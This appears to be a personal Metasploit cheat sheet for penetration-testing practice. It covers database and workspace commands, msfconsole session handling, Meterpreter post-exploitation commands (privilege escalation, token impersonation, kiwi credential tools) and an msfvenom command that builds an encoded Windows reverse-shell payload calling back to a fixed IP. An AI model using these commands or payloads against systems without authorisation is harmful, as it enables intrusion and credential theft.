# Metasploit

## Using the database

1. Start/enable postgresql service.
2. `sudo msfdb init`

Run help and check for db commands.

**Most common**

```
db_status
db_import FILENAME
db_export -f xml PATH
```

### Workspaces

To keep track of findings, msf can store it in database. To keep it clean and organized you can separate the data with workspaces.

```
workspace
workspace -a NEW_WORKSPACE
workspace -d DELETE_WORKSPACE_NAME
```

### List organized data from database

**hosts**

```
hosts -h
hosts IP
hosts IP -c address,name
hosts IP -n NEW_NAME | -m COMMENT | -t TAG
hosts -a NEW_HOST | -d DELETE_HOST

# Set RHOSTS from hosts
hosts -S SEARCH_OPTION -R

# Show hosts that are up
hosts -u
```

**services**

```
services -h
services -p PORT_NUMBER

# Auto-add to RHOSTS
services -p PORT_NUMBER --rhosts
```

**creds**

```
creds -h
```

**vulns**

Lists all detected vulnerabilities found.

## msfconsole

**General**
```
help

# Show command help
ANY_COMMAND -h

show CATEGORY

search KEYWORD
search type:auxilliary KEYWORD
use EXPLOIT_NAME/ID

# Sets RHOSTS globally
setg RHOSTS IP

# Job control
jobs
kill [id]

# Background session
CTRL+Z
# List and connect to session
sessions -l
sessions 1
# Try to upgrade shell to meterpreter
sessions -u SESSION_ID
```

Workspaces are used to separate

**Inside a module**

```
back
previous

show info | info
show options
set | unset OPTION VALUE
run | exploit

# You can set your local host(LHOST) to an interface instead of IP:
set LHOST tun0
```

## Modules

- For simple portscanners, search for **portscan**.
- To provide a connection into the framework for actions not triggered by it, like a meterpreter file, use **exploit/multi/handler**.

### Nmap and metasploit

To run nmap and automatically store results in database, use `db_nmap` inside msfconsole.

To import nmap results, import the xml output file with the `db_import FILE` command.

## Meterpreter

To be developed.

### meterpreter

```
getsystem
getuid
ps
migrate
upload
download
shell
load [powershell | incognito | kiwi]

channel -l
channel -i 3


powershell_shell

list_tokens -g
impersonate_token
```

## msfvenom

```
msfvenom --list [payloads | encoders]
msfvenom -p [somepayload] --list-options
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.210.115 RPORT=1313 -e x86/shikata_ga_nai -f exe -o upload/myman.exe
```
